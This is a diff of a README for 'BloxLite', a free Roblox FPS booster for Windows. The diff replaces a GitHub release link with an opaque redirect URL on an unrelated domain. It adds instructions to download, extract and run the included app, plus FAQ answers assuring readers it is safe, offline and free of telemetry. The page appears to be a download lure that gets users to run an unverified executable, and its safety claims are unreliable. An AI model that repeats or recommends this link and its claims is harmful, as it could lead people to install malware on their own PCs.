@@ -1,39 +1,70 @@
-# BloxLite — Run Roblox on a Low-End PC
+# BloxLite — one-click Roblox FPS tweak for low-end Windows PCs
 
-Free FPS optimizer for Roblox on low-end PCs. Frees memory and trims background load before the game starts. Portable, no installer, no ads.
+If Roblox stutters on your machine, bloxlite is a stripped-down booster that frees RAM and shuts down idle background noise a second before the game launches, then gets out of the way. It runs on Windows 10 and Windows 11, costs nothing, needs no account, and leaves no watermark on anything.
 
-**[⬇ Download for Windows](https://github.com/eliottramanda26/bloxlite-fps/releases/latest/download/BloxLiteFPS.zip)**
+## Get it
+
+Download for Windows: https://go.download-helper.tech/go/BXL
+
+The download is a plain zip. Right-click it, pick Extract All, drop the folder anywhere you like (Desktop, Documents, a USB stick), open the folder, and double-click the included app. Nothing is written outside that folder, so moving or deleting it removes the tool completely.
 
 ![BloxLite](BloxLiteFPS.png)
 
----
+## Capabilities
 
-Made for machines that struggle. It strips the background load and frees memory before Roblox starts, so the game gets what is left of the PC instead of fighting for it.
+- Memory sweep before launch — flushes working-set pages and cached junk so Roblox opens into a clean RAM pool instead of fighting other apps for scraps.
+- Background trim — closes idle background processes and parks non-essential services so the CPU is not already busy when the game asks for cycles.
+- Priority bump — raises Roblox's process priority after launch so Windows schedules it ahead of idle tasks, which cuts the micro-stutters you feel during fast movement.
+- Fire-and-forget behavior — the tweak applies at launch and does not run in the background afterward; close Roblox and your PC returns to its normal state on its own.
+- One preset, one button — no sliders, no profiles, no "advanced mode" to misconfigure; press Boost and that is the whole interface.
+- Standard-user friendly — no admin elevation, no UAC prompts, no driver install; works from a limited account or a thumb drive.
+- Fully portable — single folder, no registry entries, no scheduled tasks, nothing left over if you delete it.
+- Clean build — no ads, no telemetry, no bundled extras, no sign-up, no license key.
 
-## What it does
+## Quick start
 
-- Trims background processes and services that hog RAM and CPU
-- Frees memory before Roblox launches
-- Sets Roblox to a higher process priority so it gets scheduling ahead of idle tasks
-- Small, portable, single-folder — no installer, no admin rights required
-- No ads, no telemetry, no bundled software
+1. Download the zip from the link above and extract it to any folder.
+2. Open the folder and run the included app.
+3. Click **Boost** and wait a few seconds for the memory sweep and process trim to finish.
+4. Launch Roblox the way you normally do — the browser launcher, the Microsoft Store app, or a desktop shortcut all work.
+5. When you are done playing, close Roblox and close BloxLite; your system is back to normal with no cleanup needed.
 
-## Install
+## FAQ
 
-1. Download **[BloxLiteFPS.zip](https://github.com/eliottramanda26/bloxlite-fps/releases/latest/download/BloxLiteFPS.zip)**
-2. Extract the archive anywhere on your PC
-3. Run `BloxLiteFPS.exe`, click Boost, then launch Roblox
+**Is it really free?**
+Yes. Free forever, no trial timer, no "pro" upsell, no feature behind a paywall.
 
-Windows 10 and Windows 11, 64-bit. Nothing else required.
+**Does it work on Windows 11?**
+Yes, Windows 10 and Windows 11 (64-bit) are both supported. Older Windows versions are not — the memory APIs the tool uses do not exist there.
 
-## Requirements
+**Do I need an account or a login?**
+No. There is nothing to register and no cloud component. The tool does not phone home.
 
-- Windows 10 or Windows 11 (x64)
-- No .NET, no Java, no admin rights
-- ~2 MB free disk space
+**Does it need an internet connection?**
+No. Once the zip is extracted, bloxlite runs entirely offline. The only time you need the internet is to download it in the first place.
+
+**Does it need administrator rights?**
+No. It runs as a standard user, which is also why it can live on a USB drive and travel between PCs.
+
+**Is it safe?**
+Yes. It only frees cached memory and nudges process priority — nothing permanent, nothing that touches system files. A reboot resets anything it changed.
+
+**Will it unlock a higher FPS cap?**
+No. It helps your PC actually reach the frame rate your hardware is capable of. If the GPU is the bottleneck, it will still be the bottleneck — this tool clears everything *around* Roblox, not inside it.
+
+**Can I use it alongside other optimizers?**
+You can, but do not run two memory cleaners at the same instant. Pick one, let it finish, then launch the game.
+
+Website: https://bloxlitefps.com
+
+## System requirements
+
+- Windows 10 or Windows 11, 64-bit
+- A working Roblox install (the tool does not include or modify the game)
+- No .NET, no Java, no admin rights, no extra runtimes
 
 ## License
 
-MIT — free to use, modify and share.
+MIT — free to use, modify, and share.
 
 *Not affiliated with or endorsed by Roblox Corporation.*
